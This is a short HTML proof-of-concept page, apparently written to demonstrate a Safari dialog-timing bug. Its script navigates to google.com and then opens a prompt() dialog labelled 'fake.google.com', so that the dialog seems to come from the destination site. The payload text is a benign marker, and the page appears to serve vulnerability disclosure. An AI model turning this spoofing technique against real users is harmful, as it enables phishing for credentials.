<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Safari Dialog Timing PoC</title>
</head>
<body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
<h3>Loading…</h3>

<script>
// delay kecil biar page settle
setTimeout(() => {

  // trigger top-level navigation
  location.href = "https://google.com";

  // dialog during navigation window
  setTimeout(() => {
    prompt(
      "fake.google.com\n⚠️ Do not sign into your account",
      ""
    );
  }, 40);

}, 300);
</script>
</body>
</html>
